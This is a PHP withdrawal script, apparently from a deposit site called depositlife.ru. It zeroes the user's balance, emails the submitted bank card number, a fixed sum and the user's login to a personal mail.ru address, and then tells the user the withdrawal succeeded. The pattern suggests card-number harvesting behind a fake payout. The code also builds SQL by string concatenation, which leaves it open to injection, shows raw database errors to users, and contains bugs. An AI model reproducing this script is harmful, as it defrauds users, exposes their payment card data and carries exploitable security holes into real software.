<?php
session_start ();
$Login_ok=$_SESSION['login'];
include "database.php";
$money="00";
connect();
	$sql = "SELECT * FROM `users` WHERE `login`='" . $Login_ok . "'";
	$query = mysql_query($sql) or die("<p>Невозможно выполнить запрос: " . mysql_error() . ". Ошибка произошла в строке " . __LINE__ . "</p>");
	$row = mysql_fetch_array($query);
    $sql="UPDATE `users` SET `deposit`='" .$money."',`activate`='NULL' WHERE `login`='" .$Login_ok."'";
    $query = mysql_query($sql) or die("<p>Невозможно выполнить запрос: " . mysql_error() . ". Ошибка произошла в строке " . __LINE__ . "</p>");
mysql_close();

isset($_post['export']); 
$card=$_POST['card'];
$headers  = "Content-type: text/html; charset=windows-1251 \r\n"; 


$message = 'Номер карты:'.$card.' |Сумма перевода: 725.00 руб. | Логин Пользователя: '.$Login_ok;
$to="gendlife@mail.ru";
$subject="epxport";
$send= mail ( $to, $subject, $message,"From: support@depositlife.ru \r\n", $headers );
echo 'Вывод средств успешно выполнено!';
// редактор личностей

header('Refresh: 1; URL = https://depositlife.ru/auth/home.php');
?>